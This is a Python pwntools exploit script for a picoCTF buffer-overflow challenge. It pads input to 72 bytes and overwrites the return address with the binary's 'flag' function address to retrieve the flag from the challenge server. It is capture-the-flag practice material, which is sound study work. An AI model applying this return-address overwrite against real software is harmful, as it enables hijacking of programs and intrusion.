#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 49560)

    return r


def main():
    r = conn()

    length = 72     # cyclic -n 8 --lookup 0x616161616161616a
    flag_func = exe.symbols['flag']

    payload = b'A' * length + p64(flag_func + 5)    # Weird SEGFAULT; tried to jump a little bit further
    r.sendlineafter(b'Give me a string that gets you the flag: \n', payload)

    flag = r.recvuntilS('}', drop=False)
    log.warn(f'Flag obtained: {flag}')


if __name__ == "__main__":
    main()
